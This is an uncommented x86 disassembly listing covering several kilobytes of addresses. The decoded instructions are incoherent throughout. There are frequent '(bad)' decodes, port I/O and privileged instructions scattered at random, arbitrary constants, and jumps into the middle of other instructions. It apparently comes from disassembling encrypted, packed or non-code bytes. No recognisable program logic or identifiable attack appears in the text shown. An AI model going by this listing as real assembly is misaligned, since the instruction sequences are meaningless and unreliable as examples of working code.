  41026b:	sub    eax,0x5beaf514
  410270:	push   ebp
  410271:	(bad)  
  410272:	repz dec edx
  410274:	ror    DWORD PTR [ecx-0x66],cl
  410277:	mov    al,0x74
  410279:	mov    ss,esp
  41027b:	mov    WORD PTR [ebx+0x7656be16],?
  410281:	xchg   ebx,eax
  410282:	fistp  WORD PTR [ebp+0x25]
  410285:	sar    DWORD PTR [ebx+edx*4+0x2e494ca1],0xee
  41028d:	mov    ah,bh
  41028f:	push   ebx
  410290:	retf   
  410291:	xchg   esp,eax
  410292:	pop    ds
  410293:	popa   
  410294:	push   ebx
  410295:	sub    DWORD PTR [edi],esi
  410297:	or     esp,DWORD PTR [edx]
  410299:	pop    ebp
  41029a:	sbb    eax,DWORD PTR [esi-0x38]
  41029d:	les    ebx,FWORD PTR [esi+0x5af04655]
  4102a3:	jae    0x410253
  4102a5:	xchg   edi,eax
  4102a6:	jg     0x41030b
  4102a8:	push   0xffffff8c
  4102aa:	push   es
  4102ab:	xor    eax,0x548d3a21
  4102b0:	popf   
  4102b1:	jno    0x41029d
  4102b3:	cmp    ecx,DWORD PTR [ebp+0x733af7a7]
  4102b9:	mov    dh,ch
  4102bb:	push   ebp
  4102bc:	pop    edx
  4102bd:	mov    ebp,0x9bfdb377
  4102c2:	lods   eax,DWORD PTR ds:[esi]
  4102c3:	imul   eax,edi,0x34ad4f8f
  4102c9:	enter  0xc349,0x8a
  4102cd:	div    DWORD PTR [eax+0x76d4ed3b]
  4102d3:	loop   0x4102a8
  4102d5:	push   esp
  4102d6:	dec    edi
  4102d7:	sbb    ecx,DWORD PTR [ebx+0x2843a723]
  4102dd:	jp     0x41028f
  4102df:	cmp    edi,edi
  4102e1:	and    DWORD PTR [ebx],esi
  4102e3:	pop    ecx
  4102e4:	and    eax,0x4ca7f8aa
  4102e9:	aaa    
  4102ea:	push   ecx
  4102eb:	xchg   ecx,eax
  4102ec:	or     eax,0xc0002b6a
  4102f1:	fidiv  WORD PTR [ebp-0x3c85553]
  4102f7:	or     BYTE PTR [eax-0x61],bh
  4102fa:	jne    0x410284
  4102fc:	push   esi
  4102fd:	outs   dx,BYTE PTR ds:[esi]
  4102fe:	mov    esp,0x58d6b72d
  410303:	xchg   edx,eax
  410304:	lods   eax,DWORD PTR ds:[esi]
  410305:	es jge 0x410302
  410308:	xor    al,0xaa
  41030a:	enter  0x4607,0xf6
  41030e:	jne    0x4102b8
  410310:	or     ebp,DWORD PTR [esi]
  410312:	std    
  410313:	push   esi
  410314:	xor    al,0x6
  410316:	outs   dx,DWORD PTR ds:[esi]
  410317:	and    dl,BYTE PTR [edx]
  410319:	add    eax,0xe85615fd
  41031e:	outs   dx,DWORD PTR ds:[esi]
  41031f:	pop    ebp
  410320:	sub    ah,BYTE PTR [edx-0x34]
  410323:	push   0x887d580a
  410328:	clc    
  410329:	push   eax
  41032a:	jl     0x410392
  41032c:	xchg   ebx,eax
  41032d:	std    
  41032e:	pop    esp
  41032f:	pusha  
  410330:	sbb    eax,0xa10bf9b5
  410335:	imul   DWORD PTR [ebp-0x10066290]
  41033b:	ins    BYTE PTR es:[edi],dx
  41033c:	fmul   DWORD PTR [ebp+0x61]
  41033f:	rol    cl,1
  410341:	ror    DWORD PTR [edx+edx*4],0x44
  410345:	mov    ecx,esp
  410347:	dec    ecx
  410348:	xor    ebx,esi
  41034a:	inc    ecx
  41034b:	xor    dl,bl
  41034d:	xchg   BYTE PTR [eax+esi*4+0x5268fbe7],bh
  410354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410355:	(bad)
  410358:	add    DWORD PTR [ebx],ebp
  41035a:	adc    eax,0xa0d6d736
  41035f:	jmp    0x1179:0xf9a33f79
  410366:	les    ebp,FWORD PTR [edi-0x69811426]
  41036c:	mov    WORD PTR [esi+0x66],cs
  41036f:	cmp    DWORD PTR [edi+eax*1-0x3d],0x56
  410374:	mov    edx,0xc18274c5
  410379:	cmp    DWORD PTR [eax+0x54],0x29ae6357
  410380:	mov    edi,0xbb91992
  410385:	and    edi,DWORD PTR ds:0x8d14d197
  41038b:	dec    esi
  41038c:	push   0xba1af881
  410391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410392:	mov    bl,0x1a
  410394:	mov    bl,0xb
  410396:	jae    0x41039a
  410398:	xchg   ecx,eax
  410399:	shr    BYTE PTR [eax+0xb060fa8],0xb
  4103a0:	cmp    DWORD PTR [esp+eax*2+0x3c],ebp
  4103a4:	sub    edi,ecx
  4103a6:	mov    eax,0x5bb3f5c1
  4103ab:	mov    bh,0xbf
  4103ad:	mov    esi,0xcb46d6f6
  4103b2:	dec    eax
  4103b3:	fwait
  4103b4:	in     eax,dx
  4103b5:	pop    ss
  4103b6:	inc    edi
  4103b7:	dec    ecx
  4103b8:	scas   eax,DWORD PTR es:[edi]
  4103b9:	cmp    BYTE PTR [edi],bh
  4103bb:	jmp    0x410431
  4103bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103be:	aaa    
  4103bf:	(bad)
  4103c2:	(bad)  
  4103c3:	fistp  QWORD PTR [ebp-0x1a5adb56]
  4103c9:	dec    eax
  4103ca:	jb     0x4103a3
  4103cc:	xor    eax,0x73a1adcc
  4103d1:	loope  0x410440
  4103d3:	xchg   DWORD PTR [ebx+0x62],ebp
  4103d6:	idiv   BYTE PTR [eax]
  4103d8:	fwait
  4103d9:	add    esi,edi
  4103db:	sub    ecx,DWORD PTR [edx+0x43]
  4103de:	dec    ebp
  4103df:	sahf   
  4103e0:	ds enter 0x3904,0x21
  4103e5:	lods   eax,DWORD PTR ds:[esi]
  4103e6:	xor    eax,0xf62673d
  4103eb:	lods   eax,DWORD PTR ds:[esi]
  4103ec:	xchg   ebp,eax
  4103ed:	pushf  
  4103ee:	sub    al,0x82
  4103f0:	adc    eax,0xbd0645c0
  4103f5:	cmp    BYTE PTR [ecx],0x18
  4103f8:	xchg   DWORD PTR [ecx],eax
  4103fa:	adc    esi,esp
  4103fc:	pop    es
  4103fd:	pop    eax
  4103fe:	sub    eax,0x42f40b28
  410403:	retf   0x1a8b
  410406:	xor    al,0x73
  410408:	push   eax
  410409:	fadd   DWORD PTR [esi+0x51c8788d]
  41040f:	(bad)  
  410410:	out    dx,al
  410411:	push   edi
  410412:	cld    
  410413:	rol    BYTE PTR [bp+di+0x73],0xa1
  410418:	and    BYTE PTR [esi],dl
  41041a:	popf   
  41041b:	call   0x9a052b00
  410420:	fild   WORD PTR [esi-0x5b740a4d]
  410426:	stos   DWORD PTR es:[edi],eax
  410427:	fild   WORD PTR [eax-0x2fd017f7]
  41042d:	popf   
  41042e:	mov    esp,0x55b02466
  410433:	inc    edi
  410434:	(bad)  
  410435:	push   ss
  410436:	stos   DWORD PTR es:[edi],eax
  410437:	sub    dl,al
  410439:	out    0x59,al
  41043b:	les    edi,FWORD PTR [edi]
  41043d:	lods   eax,DWORD PTR ds:[esi]
  41043e:	push   edi
  41043f:	push   edx
  410440:	scas   eax,DWORD PTR es:[edi]
  410441:	iret   
  410442:	test   DWORD PTR [eax+esi*8+0xcb53fe],edi
  410449:	ja     0x4103da
  41044b:	mov    ecx,0xfb50cdee
  410450:	sub    al,0x8f
  410452:	fcmove st,st(3)
  410454:	(bad)  
  410455:	adc    bl,BYTE PTR [edi+0x6ad114b1]
  41045b:	scas   eax,DWORD PTR es:[edi]
  41045c:	das    
  41045d:	xor    DWORD PTR [edx+0x21],0x7a
  410461:	out    0x72,eax
  410463:	add    eax,0x6bc716b
  410468:	cmp    esi,DWORD PTR [edx-0x78]
  41046b:	out    dx,al
  41046c:	aas    
  41046d:	pop    ss
  41046e:	adc    BYTE PTR [eax-0x35],dh
  410471:	add    eax,0x97fbe76e
  410476:	pop    ds
  410477:	and    al,0xa0
  410479:	aas    
  41047a:	fidiv  WORD PTR [esi+0x1a965269]
  410480:	mov    al,0xb1
  410482:	pop    ss
  410483:	shr    edx,1
  410485:	adc    esi,DWORD PTR [esi]
  410487:	adc    al,0x36
  410489:	sbb    DWORD PTR ds:0x1ce3c8ab,edx
  41048f:	or     al,BYTE PTR [eax+edx*1]
  410492:	pop    edi
  410493:	jg     0x410472
  410495:	sbb    DWORD PTR [ebp-0x17],edi
  410498:	mov    ds:0xca9f126,eax
  41049d:	sbb    eax,DWORD PTR [bx+si+0x2a]
  4104a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a2:	xlat   BYTE PTR ds:[ebx]
  4104a3:	xor    al,0x19
  4104a5:	out    0x9a,eax
  4104a7:	jne    0x4104f4
  4104a9:	pop    eax
  4104aa:	xor    edx,DWORD PTR [edx]
  4104ac:	pop    edi
  4104ad:	scas   al,BYTE PTR es:[edi]
  4104ae:	(bad)  
  4104af:	xchg   esp,eax
  4104b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b1:	pop    edx
  4104b2:	or     al,0xef
  4104b4:	inc    edi
  4104b5:	daa    
  4104b6:	xor    bh,BYTE PTR [ecx+0x24088aa4]
  4104bc:	retf   0x1b53
  4104bf:	out    0x65,eax
  4104c1:	in     eax,0x2d
  4104c3:	pop    ecx
  4104c4:	xor    eax,0x6ea85c6
  4104c9:	push   0xffffffb1
  4104cb:	sbb    eax,0x51a45938
  4104d0:	pop    esp
  4104d1:	imul   edx,DWORD PTR [eax-0x6a],0x3d16b57c
  4104d8:	dec    ebp
  4104d9:	jecxz  0x4104f1
  4104db:	pop    ss
  4104dc:	adc    bh,cl
  4104de:	sbb    eax,0xcb216610
  4104e3:	loop   0x41048e
  4104e5:	adc    ch,al
  4104e7:	out    0xc0,al
  4104e9:	adc    cl,cl
  4104eb:	iret   
  4104ec:	test   eax,0x3ec5ce17
  4104f1:	dec    ebx
  4104f2:	xor    cl,BYTE PTR [ebp-0x784bc969]
  4104f8:	dec    edi
  4104f9:	jg     0x410494
  4104fb:	mov    cs,esi
  4104fd:	(bad)  
  4104fe:	aad    0xd7
  410500:	add    bh,BYTE PTR [esi+0x56238738]
  410506:	cmp    DWORD PTR [edx+edi*4-0x67],esi
  41050a:	mov    cl,0x9d
  41050c:	inc    esi
  41050d:	sbb    DWORD PTR [ebp-0x4822feba],ebp
  410513:	adc    DWORD PTR [edi-0x57828971],0x6b
  41051a:	pop    esi
  41051b:	jne    0x41055c
  41051d:	pop    ecx
  41051e:	pop    edi
  41051f:	and    BYTE PTR [esi-0x15],0xc4
  410523:	dec    esi
  410524:	(bad)  
  410525:	cwde   
  410526:	adc    ecx,eax
  410528:	mov    eax,0x9ed79fa9
  41052d:	mov    DWORD PTR [ebx+0x76],esi
  410530:	push   ds
  410531:	mov    ebp,0x6321bc1f
  410536:	int    0x13
  410538:	les    ebx,FWORD PTR [eax-0x5fb23a68]
  41053e:	xrelease mov DWORD PTR [ebx],eax
  410541:	call   0x20c522aa
  410546:	or     al,0x9a
  410548:	nop
  410549:	mov    ah,0xc3
  41054b:	pop    ebp
  41054c:	and    eax,0xe903161f
  410551:	out    0xc1,eax
  410553:	xchg   ebp,eax
  410554:	mov    bl,0xe1
  410556:	dec    esi
  410557:	das    
  410558:	cmp    bl,BYTE PTR [edx+0x3d]
  41055b:	adc    ecx,DWORD PTR [edi-0x4ca91784]
  410561:	ins    DWORD PTR es:[edi],dx
  410562:	mov    esp,0xf399f66a
  410567:	and    ah,dh
  410569:	rcr    DWORD PTR [ebp+0xa],cl
  41056c:	aaa    
  41056d:	xchg   BYTE PTR [edx+edx*4-0x56994330],bl
  410574:	add    al,0x35
  410576:	xchg   ebp,eax
  410577:	push   esi
  410578:	jnp    0x4105c1
  41057a:	(bad)  
  41057b:	aas    
  41057c:	pop    ds
  41057d:	mov    BYTE PTR [eax+0xa],0xb5
  410581:	add    ah,ch
  410583:	cmp    ecx,DWORD PTR [esi-0x16]
  410586:	pop    ebx
  410587:	push   ebp
  410588:	out    dx,eax
  410589:	inc    ecx
  41058a:	arpl   WORD PTR [ecx+0x59],sp
  41058d:	sbb    edx,DWORD PTR [ebp-0xf9cf00f]
  410593:	call   0x47f4b427
  410598:	push   edi
  410599:	sbb    BYTE PTR [eax-0xa],ah
  41059c:	mov    WORD PTR [edi+0x64f25474],?
  4105a2:	ja     0x410598
  4105a4:	std    
  4105a5:	add    cl,ch
  4105a7:	or     edi,edx
  4105a9:	rol    BYTE PTR [eax+edi*2],1
  4105ac:	and    DWORD PTR [edx+ebx*1+0x5f],edi
  4105b0:	add    al,0x22
  4105b3:	in     eax,0xcc
  4105b5:	push   es
  4105b6:	push   ebp
  4105b7:	add    ecx,esi
  4105b9:	add    bl,BYTE PTR [ecx+0x5e]
  4105bc:	jnp    0x410617
  4105be:	cmp    eax,0x3ebf9aaf
  4105c3:	xor    BYTE PTR [ebx+0x1d],bl
  4105c6:	cmp    BYTE PTR ds:0x6923ce95,bl
  4105cc:	xor    bl,dl
  4105ce:	or     BYTE PTR [edi-0x55],ah
  4105d1:	add    ah,BYTE PTR [esi]
  4105d3:	(bad)  
  4105d4:	shr    BYTE PTR [eax+0x2d],0x3e
  4105d8:	(bad)  
  4105d9:	cmp    esp,ebp
  4105db:	out    0x62,al
  4105dd:	inc    ebp
  4105de:	sbb    DWORD PTR [esi],edi
  4105e0:	push   edx
  4105e1:	pop    edx
  4105e2:	fadd   DWORD PTR [eax-0x1f]
  4105e5:	jns    0x410601
  4105e7:	jns    0x41063b
  4105e9:	mov    eax,ds:0xa2196cf6
  4105ee:	movaps xmm1,XMMWORD PTR [esi+ecx*1]
  4105f2:	cmp    BYTE PTR [ecx-0x67],al
  4105f5:	pop    edi
  4105f6:	outs   dx,DWORD PTR ds:[esi]
  4105f7:	push   ds
  4105f8:	jno    0x4105c7
  4105fa:	pusha  
  4105fb:	push   edx
  4105fc:	(bad)  
  4105fd:	jno    0x410607
  4105ff:	loope  0x41066a
  410601:	call   0x9657ce33
  410606:	adc    BYTE PTR [ecx],dl
  410608:	or     BYTE PTR [ebp+0xe204734],ah
  41060e:	pushf  
  41060f:	or     edx,DWORD PTR [edx-0x1b8fc698]
  410615:	mov    esp,0xfc20f777
  41061a:	test   BYTE PTR [esi],cl
  41061c:	xchg   ebp,eax
  41061d:	nop
  41061e:	sub    BYTE PTR ds:0x9a1a2f33,dl
  410624:	adc    ebx,DWORD PTR [ebx-0x561a2c9]
  41062a:	xchg   DWORD PTR [edi],eax
  41062c:	retf   
  41062d:	pushw  ds
  41062f:	enter  0xc99b,0x46
  410633:	jg     0x410626
  410635:	xor    edx,DWORD PTR [edx]
  410637:	lds    esp,FWORD PTR [esi-0x7d]
  41063a:	and    BYTE PTR [esi-0x600d242a],dh
  410640:	sbb    al,BYTE PTR [ecx]
  410642:	inc    ecx
  410643:	mov    ds:0xa438e098,eax
  410648:	mov    ds:0x74c0ad50,eax
  41064d:	inc    edi
  41064e:	and    eax,0x2f31fb21
  410653:	cmp    eax,0xb8a07ef
  410658:	das    
  410659:	hlt    
  41065a:	jnp    0x4106d5
  41065c:	test   DWORD PTR [ebp-0x13],eax
  41065f:	mov    ss:0xda160509,al
  410665:	jmp    0x41062f
  410667:	cli    
  410668:	fwait
  410669:	daa    
  41066a:	in     al,0xbd
  41066c:	dec    edi
  41066d:	loope  0x4106b8
  41066f:	mov    DWORD PTR [esi+0x67f960b3],ecx
  410675:	scas   al,BYTE PTR es:[edi]
  410676:	inc    edx
  410677:	inc    ebx
  410678:	mov    ah,0x56
  41067a:	xchg   DWORD PTR [ebx+0x420b8806],esi
  410680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410681:	aaa    
  410682:	scas   eax,DWORD PTR es:[edi]
  410683:	mov    ch,0xcc
  410685:	xchg   ebx,eax
  410686:	and    ebx,DWORD PTR [edi+eax*2-0x2020d8d1]
  41068d:	adc    ch,BYTE PTR [eax+0x25]
  410690:	xor    dh,BYTE PTR [eax+edi*2-0x16d3cd50]
  410697:	inc    edi
  410698:	and    ecx,DWORD PTR [ecx-0x2045dc1]
  41069e:	push   ebx
  41069f:	adc    BYTE PTR [edx+ecx*1+0x42],0xbf
  4106a4:	(bad)  
  4106a5:	mov    eax,ds:0x515fcdff
  4106aa:	sub    bl,BYTE PTR [eax]
  4106ac:	sbb    al,BYTE PTR [edi]
  4106ae:	data16 jns 0x410688
  4106b1:	push   es
  4106b2:	(bad)  
  4106b3:	mov    bh,0xcc
  4106b5:	test   DWORD PTR [edi+0x46],edx
  4106b8:	push   ebp
  4106b9:	cmp    eax,ebx
  4106bb:	inc    eax
  4106bc:	ss pushf 
  4106be:	add    BYTE PTR [edx],0x3b
  4106c1:	out    0x7,eax
  4106c3:	ins    DWORD PTR es:[edi],dx
  4106c4:	dec    edx
  4106c5:	mov    eax,0xc49fcb89
  4106ca:	sub    bh,BYTE PTR [esp+ebp*4]
  4106cd:	pop    edi
  4106ce:	add    esp,esp
  4106d0:	cmp    al,0x34
  4106d2:	dec    ebp
  4106d3:	or     eax,0xc7f4f6b9
  4106d8:	xchg   esi,eax
  4106d9:	push   esp
  4106da:	add    al,0x52
  4106dc:	leave  
  4106dd:	push   esp
  4106de:	(bad)  
  4106df:	out    0x7c,al
  4106e1:	jbe    0x4106d9
  4106e3:	or     eax,0x91ca27d6
  4106e8:	cmc    
  4106e9:	xchg   ebp,eax
  4106ea:	lahf   
  4106eb:	xor    DWORD PTR [eax+eiz*4-0x1757e2b1],esp
  4106f2:	xchg   edi,eax
  4106f3:	je     0x410739
  4106f5:	mov    gs,ecx
  4106f7:	imul   esi,DWORD PTR [esi],0x1a7d8467
  4106fd:	inc    edx
  4106fe:	push   ecx
  4106ff:	ffreep st(3)
  410701:	cmp    dh,BYTE PTR [ebx]
  410703:	cli    
  410704:	push   esp
  410705:	int3   
  410706:	adc    eax,0x4cef53fc
  41070b:	mov    DWORD PTR [ebp+0x10b3796a],ecx
  410711:	fs ins BYTE PTR es:[edi],dx
  410713:	or     ebp,edx
  410715:	jl     0x41072b
  410717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410718:	xor    al,0x50
  41071a:	loopne 0x4106fb
  41071c:	cmp    eax,0x57006323
  410721:	sar    BYTE PTR [ebp+0x3d39274f],cl
  410727:	mov    ah,0xd8
  410729:	mov    bh,0xd3
  41072b:	js     0x410716
  41072d:	(bad)  
  41072e:	rcr    DWORD PTR [ebx],cl
  410730:	or     BYTE PTR [bx+si-0x6879],0xd
  410736:	add    DWORD PTR [esi-0x78ccfa4b],esi
  41073c:	test   eax,0x8c13949f
  410741:	push   ebp
  410742:	ffreep st(2)
  410744:	jnp    0x410724
  410746:	inc    ebp
  410747:	push   ds
  410748:	push   ebp
  410749:	int    0x6f
  41074b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41074c:	xor    esi,esi
  41074e:	push   edx
  41074f:	add    DWORD PTR [esi+eax*1+0x62],ebx
  410753:	inc    ebx
  410754:	aaa    
  410755:	(bad)  
  410756:	mov    al,0x74
  410758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410759:	out    0x49,eax
  41075b:	imul   BYTE PTR [esi]
  41075d:	rol    cl,cl
  41075f:	push   esi
  410760:	sub    BYTE PTR [edx+0x62961b07],cl
  410766:	dec    esi
  410767:	loopne 0x4107ab
  410769:	sub    ebp,DWORD PTR [edx-0x58360eab]
  41076f:	nop
  410770:	pop    esi
  410771:	mov    edx,ecx
  410773:	sbb    DWORD PTR [ecx],esi
  410775:	cmp    BYTE PTR [esi],bl
  410777:	dec    edx
  410778:	retf   
  410779:	pop    edi
  41077a:	int3   
  41077b:	dec    esi
  41077c:	sti    
  41077d:	inc    ebx
  41077e:	push   ebx
  41077f:	xchg   BYTE PTR [ebp-0x32],ch
  410782:	(bad)
  410786:	dec    ebx
  410787:	sub    ebx,DWORD PTR [edx-0x72]
  41078a:	lods   eax,DWORD PTR ds:[esi]
  41078b:	jno    0x4107cc
  41078d:	or     al,0x19
  41078f:	jns    0x4107de
  410791:	xchg   ebx,eax
  410792:	add    ah,cl
  410794:	out    dx,al
  410795:	and    ah,0xf4
  410798:	or     esi,ecx
  41079a:	sbb    DWORD PTR [ecx],esi
  41079c:	out    0x6e,al
  41079e:	hlt    
  41079f:	fld    st(1)
  4107a1:	jle    0x41074d
  4107a3:	loope  0x4107b8
  4107a5:	gs dec ecx
  4107a7:	cmc    
  4107a8:	pop    ds
  4107a9:	dec    eax
  4107aa:	mov    ch,0x28
  4107ac:	data16 cmp BYTE PTR [esi+0x3c],ch
  4107b0:	ins    DWORD PTR es:[edi],dx
  4107b1:	adc    esp,DWORD PTR [ebx-0x67]
  4107b4:	sbb    dh,ah
  4107b6:	jle    0x410831
  4107b8:	lock enter 0x75ad,0x37
  4107bd:	xchg   edx,eax
  4107be:	cld    
  4107bf:	cmp    al,0x19
  4107c1:	dec    edx
  4107c2:	rol    DWORD PTR [ecx+0x46de42dd],0x6c
  4107c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ca:	and    BYTE PTR [esi-0x7f],0xbf
  4107ce:	cdq    
  4107cf:	mov    WORD PTR [eax-0x55],cs
  4107d2:	imul   ebx,DWORD PTR [edi],0xffffffe0
  4107d5:	test   al,0x5e
  4107d7:	sti    
  4107d8:	data16 sub dh,dh
  4107db:	mov    di,0x1e4a
  4107df:	push   ds
  4107e0:	enter  0xe429,0x6d
  4107e4:	mov    al,ds:0xc3d085a9
  4107e9:	and    ecx,DWORD PTR [edi-0x3c]
  4107ec:	lahf   
  4107ed:	sub    al,0xd5
  4107ef:	mov    esi,0xb40e4acb
  4107f4:	or     ah,dl
  4107f6:	push   ebx
  4107f7:	xchg   esp,eax
  4107f8:	test   BYTE PTR [eax+0x9],bl
  4107fb:	out    0x33,eax
  4107fd:	push   ecx
  4107fe:	stc    
  4107ff:	mov    esp,0xa6b33682
  410804:	out    0xac,al
  410806:	xor    DWORD PTR [edi+0x20],0x42
  41080a:	cmp    DWORD PTR [edx-0x35212590],esi
  410810:	out    dx,eax
  410811:	int    0x13
  410813:	lods   eax,DWORD PTR ds:[esi]
  410814:	stc    
  410815:	ror    DWORD PTR [ecx+0x1ac59541],cl
  41081b:	test   BYTE PTR [edi-0x4016fe9d],ch
  410821:	pop    ss
  410822:	daa    
  410823:	(bad)  
  410824:	aas    
  410825:	loope  0x41080e
  410827:	(bad)  
  410829:	imul   esi,DWORD PTR [ebx+0x40],0xe78114d
  410830:	xor    eax,DWORD PTR [ebx]
  410832:	(bad)  
  410833:	dec    esp
  410834:	mov    ?,WORD PTR [edx-0x398857f9]
  41083a:	shl    BYTE PTR gs:[eax+0x20],0x5
  41083f:	popa   
  410840:	lds    eax,FWORD PTR [esi+0x10]
  410843:	lea    ebp,[edx-0x6a3564bd]
  410849:	nop
  41084a:	mov    bl,0x38
  41084c:	test   al,0x54
  41084e:	dec    esi
  41084f:	xchg   edi,eax
  410850:	fucom  st(6)
  410852:	mov    al,0x29
  410854:	jnp    0x41089d
  410856:	sbb    cl,BYTE PTR [ebp+0x6]
  410859:	retf   
  41085a:	xchg   edx,eax
  41085b:	and    DWORD PTR [ecx+eiz*1+0x15],esp
  41085f:	leave  
  410860:	adc    DWORD PTR [ecx-0x65f54866],ebp
  410866:	into   
  410867:	ret    
  410868:	sbb    eax,DWORD PTR [edx]
  41086a:	dec    eax
  41086b:	mov    esp,0x79cbb49a
  410870:	pop    es
  410871:	mov    dh,0x4d
  410873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410874:	pusha  
  410875:	sub    al,0x2b
  410877:	mov    dh,0x37
  410879:	stc    
  41087a:	cmp    al,0x69
  41087c:	mov    ebx,0xce761567
  410881:	ds (bad) 
  410883:	cld    
  410884:	xchg   ebx,eax
  410885:	or     cl,BYTE PTR [eax-0x1]
  410888:	push   0xd3c615aa
  41088d:	dec    esi
  41088e:	dec    esp
  41088f:	out    0x7b,al
  410891:	ins    DWORD PTR es:[edi],dx
  410892:	cli    
  410893:	push   esp
  410894:	enter  0x9f28,0x36
  410898:	inc    ebx
  410899:	leave  
  41089a:	xor    eax,0xe8a3b869
  41089f:	icebp  
  4108a0:	push   es
  4108a1:	retf   0x5eff
  4108a4:	jb     0x41087b
  4108a6:	rcr    BYTE PTR [eax+0x1a],0xfe
  4108aa:	test   eax,0x666def1d
  4108af:	ret    0x3fa0
  4108b2:	mov    esp,0xbcb275a9
  4108b7:	mov    eax,0xec005186
  4108bc:	imul   edi,esp,0x7a
  4108bf:	ins    BYTE PTR es:[edi],dx
  4108c0:	retf   
  4108c1:	jnp    0x410900
  4108c3:	sbb    DWORD PTR [esi],0xdc187edf
  4108c9:	scas   al,BYTE PTR es:[edi]
  4108ca:	ret    0x93fc
  4108cd:	push   ecx
  4108ce:	je     0x410875
  4108d0:	sbb    al,0x56
  4108d2:	hlt    
  4108d3:	repnz mov ds:0x6d0f41ef,al
  4108d9:	mov    edi,DWORD PTR [ebp-0x3a24e566]
  4108df:	xchg   esi,eax
  4108e0:	mov    esp,0x10b5551f
  4108e5:	fnstenv [edi+ebp*1]
  4108e8:	dec    ecx
  4108e9:	ss jnp 0x4108fc
  4108ec:	jbe    0x4108d3
  4108ee:	sti    
  4108ef:	sbb    DWORD PTR [eax-0x6783f981],esp
  4108f5:	loope  0x41090f
  4108f7:	ror    BYTE PTR [ebx-0xeeaffdb],1
  4108fd:	ret    
  4108fe:	sbb    DWORD PTR [ecx],ebx
  410900:	ret    0x8980
  410903:	adc    eax,0xb32f09d7
  410908:	push   ecx
  410909:	pushf  
  41090a:	fist   DWORD PTR [ebp-0x5f091a40]
  410911:	int3   
  410912:	ror    BYTE PTR [edi-0x7c947016],0x93
  410919:	sub    eax,0xd4475078
  41091e:	stos   DWORD PTR es:[edi],eax
  41091f:	dec    ebx
  410920:	ror    esp,cl
  410922:	jl     0x41099f
  410924:	repnz ds ds mov ah,0xb6
  410929:	jmp    0x410946
  41092b:	xchg   dh,cl
  41092d:	xchg   ebp,eax
  41092e:	add    eax,0x2b04867d
  410933:	fimul  DWORD PTR [esi+eiz*1]
  410936:	push   0x44
  410938:	scas   al,BYTE PTR es:[edi]
  410939:	pop    esp
  41093a:	and    eax,0x9a348812
  41093f:	(bad)  
  410940:	hlt    
  410941:	pop    eax
  410942:	test   ch,dh
  410944:	into   
  410945:	dec    edx
  410946:	jb     0x41092b
  410948:	mov    cl,BYTE PTR [edi]
  41094a:	or     BYTE PTR [edx+0x4e0d7978],ah
  410950:	cmp    DWORD PTR [esi-0x41e09436],ebx
  410956:	repz add BYTE PTR [ebx+0x40],ah
  41095a:	mov    edi,0xf2083ee8
  41095f:	scas   al,BYTE PTR es:[edi]
  410960:	xlat   BYTE PTR ds:[ebx]
  410961:	jb     0x4109ae
  410963:	(bad)  
  410964:	xchg   esi,eax
  410965:	arpl   dx,bx
  410967:	(bad)  
  410968:	jne    0x410947
  41096a:	test   ecx,edi
  41096c:	in     eax,dx
  41096d:	repz and BYTE PTR [ecx+0x23910fb0],al
  410974:	shl    BYTE PTR [edi],0x15
  410977:	sub    esi,DWORD PTR [esp+ebx*1-0x2eda8dc4]
  41097e:	es push edx
  410980:	shl    esi,cl
  410982:	jmp    0x410949
  410984:	sbb    ebp,DWORD PTR [eax]
  410986:	cmp    BYTE PTR ds:0x4ef977df,dl
  41098c:	stc    
  41098d:	jecxz  0x4109c2
  41098f:	out    0x51,al
  410991:	and    ecx,DWORD PTR [ebx+0x34]
  410994:	aaa    
  410995:	xchg   ebp,eax
  410996:	mov    DWORD PTR ds:0xf835db68,0x5c2154ba
  4109a0:	add    eax,0x9886eaa7
  4109a5:	mov    cl,0x80
  4109a7:	jno    0x4109d3
  4109a9:	loope  0x410931
  4109ab:	cwde   
  4109ac:	(bad)  
  4109ad:	cmp    al,0xda
  4109af:	jg     0x410964
  4109b1:	inc    esp
  4109b2:	pop    dx
  4109b4:	rcr    DWORD PTR [ecx-0x1b2a9ceb],cl
  4109ba:	dec    eax
  4109bb:	leave  
  4109bc:	cwde   
  4109bd:	push   ebp
  4109be:	sub    eax,0xdbf70043
  4109c3:	cli    
  4109c4:	shl    BYTE PTR [ecx+0x66],cl
  4109c7:	xor    ch,BYTE PTR [edx-0x48e29148]
  4109cd:	pop    edx
  4109ce:	pop    edi
  4109cf:	es inc ebx
  4109d1:	sub    BYTE PTR [edx+ebx*1+0x6b],bl
  4109d5:	add    eax,0x9a6be71a
  4109da:	sub    ah,BYTE PTR [ebp-0x52]
  4109dd:	sbb    DWORD PTR [edi],0x76fa9214
  4109e3:	out    0xab,eax
  4109e5:	mov    bl,0x6d
  4109e7:	inc    eax
  4109e8:	xlat   BYTE PTR ds:[ebx]
  4109e9:	imul   ebp,DWORD PTR [ebx+ebp*8],0x4f279558
  4109f0:	stos   BYTE PTR es:[edi],al
  4109f1:	loope  0x4109c3
  4109f3:	aas    
  4109f4:	dec    eax
  4109f5:	dec    eax
  4109f6:	stc    
  4109f7:	push   ecx
  4109f8:	dec    edx
  4109f9:	xchg   ecx,edx
  4109fb:	daa    
  4109fc:	pop    edi
  4109fd:	dec    edx
  4109fe:	cmp    dh,0x10
  410a01:	jae    0x410a6a
  410a03:	lock inc ebp
  410a05:	mov    eax,ds:0x604aa900
  410a0a:	test   eax,0xf0067430
  410a0f:	sbb    ebx,DWORD PTR [edx+0x3068f5bd]
  410a15:	scas   eax,DWORD PTR es:[edi]
  410a16:	aas    
  410a17:	(bad)  
  410a19:	sbb    eax,0xa18d4a5e
  410a1e:	icebp  
  410a1f:	or     DWORD PTR [edx-0x21],ebx
  410a22:	loopne 0x4109b4
  410a24:	xor    al,bl
  410a26:	pop    ds
  410a27:	nop
  410a28:	mov    eax,ds:0x4f06ffd5
  410a2e:	(bad)  
  410a2f:	in     al,0x9e
  410a31:	mov    edi,0x9bd7c74b
